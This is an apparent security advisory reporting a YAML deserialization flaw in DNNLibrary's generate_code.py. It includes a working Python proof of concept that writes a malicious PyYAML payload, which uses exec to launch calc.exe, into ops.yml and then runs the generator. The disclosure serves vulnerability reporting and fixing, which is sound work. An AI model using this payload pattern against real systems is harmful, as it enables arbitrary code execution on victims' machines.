# Description

DNNLibrary is a wrapper of NNAPI ("DNNLibrary" is for "daquexian's NNAPI library). It lets you easily make the use of the new NNAPI introduced in Android 8.1. You can convert your onnx model into daq and run the model directly.

# Vulnerability

Vulnerable to YAML deserialization attack caused by unsafe loading.

# Proof of Concept

```
# vulnerable part of code
https://github.com/JDAI-CV/DNNLibrary/blob/master/generate_code.py#L329
Note :
to apply a complete fix please do fix all the yaml.load() in the functions mentioned in the main().
```
```python
# exploit.py
import os
#os.system("git clone https://github.com/JDAI-CV/DNNLibrary.git")
os.chdir("DNNLibrary/")
os.system("rm ops.yml")
payload = """!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('calc.exe')"
"""
open("ops.yml","w+").write(payload)
os.system("python3 generate_code.py")
```

![](https://user-images.githubusercontent.com/43377443/105158203-ba2e7a80-5b33-11eb-8bab-e0ec49b18f58.PNG)
# Impact

Arbitary Code Execution
